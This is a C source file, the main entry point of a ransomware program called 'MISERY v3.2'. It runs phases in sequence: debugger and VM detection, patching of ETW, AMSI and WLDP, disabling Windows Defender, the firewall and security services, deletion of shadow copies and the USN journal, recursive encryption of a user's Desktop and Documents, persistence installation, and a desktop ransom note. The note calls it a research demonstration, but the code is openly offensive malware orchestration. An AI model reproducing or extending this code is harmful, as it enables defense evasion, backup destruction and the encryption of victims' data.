#include "misery_config.h"
#include "crypto.h"
#include "fileops.h"
#include "defense.h"
#include "security.h"
#include "persistence.h"
#include "utils.h"
#include "ransomnote.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <windows.h>
#include <time.h>
#include <shlobj.h>

/* ============================================================
 * MISERY ORCHESTRATION ENGINE
 * Main entry point that coordinates all subsystems
 * ============================================================ */

#define KEYFILE "misery.key"
#define MAX_TARGETS 100
#define ENCRYPTION_TIMEOUT_MS 300000  /* 5 minutes */

/* Target directories for encryption */
static const char *g_target_dirs[] = {
    "C:\\Users\\jahan\\OneDrive\\Desktop",
    "C:\\Users\\jahan\\Documents",
    NULL
};

/* ============================================================
 * RANSOM NOTE CONTENT
 * ============================================================ */
static const char *GetRansomNoteContent(void) {
    static char note_buffer[4096] = {0};
    if (note_buffer[0] == 0) {
        snprintf(note_buffer, sizeof(note_buffer),
            "========================================\n"
            "YOUR FILES HAVE BEEN ENCRYPTED\n"
            "========================================\n"
            "This is a research project demonstration.\n"
            "For authorized penetration tests only.\n"
            "========================================\n");
    }
    return note_buffer;
}

/* ============================================================
 * PHASE EXECUTION: Anti-Analysis
 * ============================================================ */
static bool ExecutePhaseAntiAnalysis(void) {
    MiseryLog(MISERY_LOG_INFO, "Starting ANTI-ANALYSIS phase...");
    
    bool success = true;
    
    /* Check for debuggers and analysis tools */
    if (DefenseCheckDebugger()) {
        MiseryLog(MISERY_LOG_WARN, "Debugger detected! Aborting execution.");
        return false;
    }
    
    if (DefenseDetectAnalysisTools()) {
        MiseryLog(MISERY_LOG_WARN, "Analysis tools detected! Proceeding with caution.");
        success = false;  /* Log but continue */
    }
    
    if (DefenseDetectVirtualMachine()) {
        MiseryLog(MISERY_LOG_WARN, "Virtual machine detected! Proceeding with caution.");
        success = false;  /* Log but continue */
    }
    
    return MiseryPhaseTransition(PHASE_ANTI_ANALYSIS, success);
}

/* ============================================================
 * PHASE EXECUTION: Defense Patching
 * ============================================================ */
static bool ExecutePhaseDefensePatching(void) {
    MiseryLog(MISERY_LOG_INFO, "Starting DEFENSE PATCHING phase...");
    
    bool success = true;
    
    /* Patch ETW (Event Tracing for Windows) */
    if (!DefensePatchETW()) {
        MiseryLog(MISERY_LOG_WARN, "ETW patching failed");
        success = false;
    }
    
    /* Patch AMSI (Antimalware Scan Interface) */
    if (!DefensePatchAMSI()) {
        MiseryLog(MISERY_LOG_WARN, "AMSI patching failed");
        success = false;
    }
    
    /* Patch WLDP (Windows Lockdown Policy) */
    if (!DefensePatchWLDP()) {
        MiseryLog(MISERY_LOG_WARN, "WLDP patching failed");
        success = false;
    }
    
    /* Hide from debugger */
    DefenseHideFromDebugger();
    
    DefenseResetSecurityChecks();
    
    return MiseryPhaseTransition(PHASE_DEFENSE_DISABLE, success);
}

/* ============================================================
 * PHASE EXECUTION: Security Disabling
 * ============================================================ */
static bool ExecutePhaseSecurityDisable(void) {
    MiseryLog(MISERY_LOG_INFO, "Starting SECURITY DISABLE phase...");
    
    bool success = true;
    
    /* Disable Windows Defender */
    if (!SecurityDisableDefender()) {
        MiseryLog(MISERY_LOG_WARN, "Defender disable failed");
        success = false;
    }
    
    /* Kill security services */
    if (!SecurityKillSecurityServices()) {
        MiseryLog(MISERY_LOG_WARN, "Security service termination failed");
        success = false;
    }
    
    /* Disable Windows Firewall */
    if (!SecurityDisableFirewall()) {
        MiseryLog(MISERY_LOG_WARN, "Firewall disable failed");
        success = false;
    }
    
    return MiseryPhaseTransition(PHASE_DEFENSE_DISABLE, success);
}

/* ============================================================
 * PHASE EXECUTION: Backup Destruction
 * ============================================================ */
static bool ExecutePhaseBackupDestroy(void) {
    MiseryLog(MISERY_LOG_INFO, "Starting BACKUP DESTRUCTION phase...");
    
    bool success = true;
    
    /* Destroy Volume Shadow Copies */
    if (!UtilsNukeBackups()) {
        MiseryLog(MISERY_LOG_WARN, "Backup nuke failed");
        success = false;
    }
    
    /* Wipe USN Journal */
    if (!UtilsWipeUSNJournal()) {
        MiseryLog(MISERY_LOG_WARN, "USN Journal wipe failed");
        success = false;
    }
    
    return MiseryPhaseTransition(PHASE_BACKUP_DESTROY, success);
}

/* ============================================================
 * PHASE EXECUTION: File Encryption (via FileOps)
 * ============================================================ */
static bool ExecutePhaseEncryption(bool decryptmode) {
    MISERY_PHASE target_phase = PHASE_ENCRYPTION;
    MiseryLog(MISERY_LOG_INFO, "Starting ENCRYPTION phase (mode: %s)...", 
              decryptmode ? "DECRYPT" : "ENCRYPT");
    
    bool success = true;
    FILEOPS_CONFIG cfg = {0};
    
    /* Get crypto context - MUST be valid */
    CRYPTO_CTX *crypto_ctx = GetCryptoCtx();
    if (!crypto_ctx || !crypto_ctx->initialized) {
        MiseryLog(MISERY_LOG_ERROR, "Crypto context not initialized!");
        return MiseryPhaseTransition(target_phase, false);
    }
    
    /* Configure file operations */
    cfg.threadCount = 8;
    cfg.ioBufferSize = (64 * 1024);
    cfg.flags = FILEOPS_FLAG_RECURSIVE;
    cfg.pfnShouldSkip = FileOps_DefaultShouldSkip;
    cfg.crypto_ctx = crypto_ctx;  /* PASS CRYPTO CONTEXT EXPLICITLY */
    
    MiseryLog(MISERY_LOG_INFO, "FileOps config: crypto_ctx=%p, threads=%lu", 
              cfg.crypto_ctx, cfg.threadCount);
    
    /* Initialize file operations context */
    FILEOPS_CTX *fileops_ctx = FileOps_CreateContext(&cfg);
    if (!fileops_ctx) {
        MiseryLog(MISERY_LOG_ERROR, "Failed to create FileOps context");
        return MiseryPhaseTransition(target_phase, false);
    }
    
    /* Process each target directory */
    for (int i = 0; g_target_dirs[i] != NULL; i++) {
        MiseryLog(MISERY_LOG_INFO, "Processing directory: %s", g_target_dirs[i]);
        
        /* Convert to wide character for FileOps */
        WCHAR wide_path[32768];
        int wlen = MultiByteToWideChar(CP_UTF8, 0, g_target_dirs[i], -1,
                                        wide_path, 32768);
        if (wlen <= 0) {
            MiseryLog(MISERY_LOG_WARN, "Path conversion failed for: %s", g_target_dirs[i]);
            success = false;
            continue;
        }
        
        /* Queue files for processing */
        FileOps_TraverseAndQueue(fileops_ctx, wide_path);
    }
    
    /* Wait for all encryption operations to complete */
    MiseryLog(MISERY_LOG_INFO, "Waiting for file operations to complete...");
    FileOps_WaitForCompletion(fileops_ctx);
    
    /* Get statistics */
    FILEOPS_STATS stats = {0};
    FileOps_GetStats(fileops_ctx, &stats);
    
    MiseryLog(MISERY_LOG_INFO, "Encryption stats: %lld bytes processed, %lld succeeded, %lld failed",
              stats.bytesProcessed, stats.filesSucceeded, stats.filesFailed);
    
    /* Update global context statistics */
    g_misery_ctx.filesEncrypted = (DWORD)stats.filesSucceeded;
    g_misery_ctx.filesFailed = (DWORD)stats.filesFailed;
    g_misery_ctx.bytesEncrypted = stats.bytesProcessed;
    
    /* Cleanup file operations */
    FileOps_DestroyContext(fileops_ctx);
    
    return MiseryPhaseTransition(target_phase, success && stats.filesFailed == 0);
}

/* ============================================================
 * PHASE EXECUTION: Persistence Installation
 * ============================================================ */
static bool ExecutePhasePeristence(void) {
    MiseryLog(MISERY_LOG_INFO, "Starting PERSISTENCE phase...");
    
    bool success = true;
    
    /* Install all persistence mechanisms */
    if (!PersistenceInstallAll()) {
        MiseryLog(MISERY_LOG_WARN, "Persistence installation encountered issues");
        success = false;
    }
    
    return MiseryPhaseTransition(PHASE_PERSISTENCE, success);
}

/* ============================================================
 * PHASE EXECUTION: Ransom Note Delivery
 * ============================================================ */
static bool ExecutePhaseRansomNote(void) {
    MiseryLog(MISERY_LOG_INFO, "Starting RANSOM NOTE phase...");

    bool success = true;

    /* Drop text-based ransom note on desktop */
    const char *note_content = GetRansomNoteContent();
    char desktop_path[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop_path) == S_OK) {
        char note_path[MAX_PATH * 2];
        snprintf(note_path, sizeof(note_path), "%s\\README.txt", desktop_path);

        if (!UtilsDropRansomNote(note_path, note_content)) {
            MiseryLog(MISERY_LOG_WARN, "Failed to drop ransom note on desktop");
            success = false;
        }
    }

    /* Show the GUI window — BLOCKING, stays until user clicks CLOSE */
    MiseryLog(MISERY_LOG_INFO, "Showing ransom note window (blocking)...");
    ShowRansomNoteWindow();

    MiseryLog(MISERY_LOG_INFO, "Ransom note window dismissed by user");

    return MiseryPhaseTransition(PHASE_RANSOM_NOTE, success);
}

/* ============================================================
 * PHASE EXECUTION: Cleanup
 * ============================================================ */
static bool ExecutePhaseCleanup(void) {
    MiseryLog(MISERY_LOG_INFO, "Starting CLEANUP phase...");
    
    CleanupCrypto();
    
    return MiseryPhaseTransition(PHASE_CLEANUP, true);
}

/* ============================================================
 * MAIN ORCHESTRATION
 * ============================================================ */
int main(int argc, char **argv) {
    DWORD start_time = GetTickCount();
    
    /* Initialize context */
    if (!MiseryInitContext()) {
        puts("[!] Failed to initialize context");
        return 1;
    }
    
    puts("========== MISERY v3.2 RANSOMWARE ENGINE ==========");
    MiseryLog(MISERY_LOG_INFO, "=== MISERY INITIALIZATION ===");
    
    /* Parse command line */
    bool decryptmode = (argc > 1 && strcmp(argv[1], "-d") == 0);
    MiseryLog(MISERY_LOG_INFO, "Mode: %s", decryptmode ? "DECRYPT" : "ENCRYPT");
    
    /* Crypto initialization */
    const char *keyfile = KEYFILE;
    char key[256] = {0};
    BYTE salt[SALT_SIZE] = {0};
    
    if (!decryptmode) {
        /* Encryption mode: generate new crypto context */
        snprintf(key, sizeof(key), "Thejahanzaib@1318");
        
        if (InitCrypto(key, strlen(key), NULL) != CRYPTO_SUCCESS) {
            MiseryLog(MISERY_LOG_ERROR, "Failed to initialize crypto!");
            MiseryCleanupContext();
            return 1;
        }
        memcpy(salt, GetCryptoCtx()->salt, SALT_SIZE);
        
        /* Save key and salt */
        FILE *kf = fopen(keyfile, "wb");
        if (kf) {
            fwrite(salt, 1, SALT_SIZE, kf);
            fprintf(kf, "%s\n", key);
            fclose(kf);
            MiseryLog(MISERY_LOG_INFO, "Key and salt saved to %s", keyfile);
        }
    } else {
        /* Decryption mode: load crypto context from file */
        FILE *kf = fopen(keyfile, "rb");
        if (!kf) {
            MiseryLog(MISERY_LOG_ERROR, "Missing %s!", keyfile);
            MiseryCleanupContext();
            return 1;
        }
        fread(salt, 1, SALT_SIZE, kf);
        fgets(key, sizeof(key), kf);
        key[strcspn(key, "\r\n")] = 0;
        fclose(kf);
        
        if (InitCrypto(key, strlen(key), salt) != CRYPTO_SUCCESS) {
            MiseryLog(MISERY_LOG_ERROR, "Failed to initialize crypto for decrypt!");
            MiseryCleanupContext();
            return 1;
        }
        MiseryLog(MISERY_LOG_INFO, "Decrypt mode: salt and key loaded from %s", keyfile);
    }
    
    /* Execute phases in sequence */
    MiseryLog(MISERY_LOG_INFO, "=== PHASE EXECUTION SEQUENCE ===");
    
    /* Phase 1: Anti-Analysis */
    if (!ExecutePhaseAntiAnalysis()) {
        MiseryLog(MISERY_LOG_WARN, "Anti-analysis phase failed");
        /* Continue anyway */
    }
    
    /* Phase 2: Defense Patching */
    if (!ExecutePhaseDefensePatching()) {
        MiseryLog(MISERY_LOG_WARN, "Defense patching phase encountered issues");
        /* Continue anyway */
    }
    
    /* Phase 3: Security Disable */
    if (!ExecutePhaseSecurityDisable()) {
        MiseryLog(MISERY_LOG_WARN, "Security disable phase encountered issues");
        /* Continue anyway */
    }
    
    /* Phase 4: Backup Destruction */
    if (!ExecutePhaseBackupDestroy()) {
        MiseryLog(MISERY_LOG_WARN, "Backup destruction phase encountered issues");
        /* Continue anyway */
    }
    
    /* Phase 5: Encryption (main payload) */
    if (!ExecutePhaseEncryption(decryptmode)) {
        MiseryLog(MISERY_LOG_ERROR, "Encryption phase failed");
        MiseryCleanupContext();
        return 1;
    }
    
    /* Phase 6: Persistence (only in encrypt mode) */
    if (!decryptmode) {
        if (!ExecutePhasePeristence()) {
            MiseryLog(MISERY_LOG_WARN, "Persistence phase encountered issues");
            /* Continue anyway */
        }
        
        /* Phase 7: Ransom Note */
        if (!ExecutePhaseRansomNote()) {
            MiseryLog(MISERY_LOG_WARN, "Ransom note phase encountered issues");
            /* Continue anyway */
        }
    }
    
    /* Phase 8: Cleanup */
    if (!ExecutePhaseCleanup()) {
        MiseryLog(MISERY_LOG_WARN, "Cleanup phase encountered issues");
    }
    
    /* Calculate execution time */
    DWORD end_time = GetTickCount();
    g_misery_ctx.executionTimeMs = (end_time - start_time);
    
    /* Report final statistics */
    MiseryLog(MISERY_LOG_INFO, "=== EXECUTION COMPLETE ===");
    MiseryReportStats();
    
    /* Final cleanup */
    MiseryCleanupContext();
    
    MiseryLog(MISERY_LOG_INFO, "Total execution time: %lu ms", g_misery_ctx.executionTimeMs);
    puts("[+] Done");
    return 0;
}
